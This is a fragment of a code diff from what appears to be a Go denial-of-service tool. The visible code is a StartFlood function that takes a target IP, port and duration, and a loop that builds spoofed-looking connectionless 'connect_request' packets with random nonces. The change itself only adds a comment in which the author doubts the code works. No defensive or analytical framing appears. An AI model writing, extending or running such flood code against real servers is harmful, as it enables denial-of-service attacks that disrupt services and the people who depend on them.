@@ -44,7 +44,7 @@ func StartFlood(targetIP string, port int, durationSecs int, conn net.Conn) {
 
 				for j := 0; j < 100; j++ {
 					allocBuf[0], allocBuf[1], allocBuf[2], allocBuf[3] = 0xFF, 0xFF, 0xFF, 0xFF
-
+					// again, idk if ts works.
 					copy(allocBuf[4:], "connect_request ")
 
 					nonce := r.Uint32()
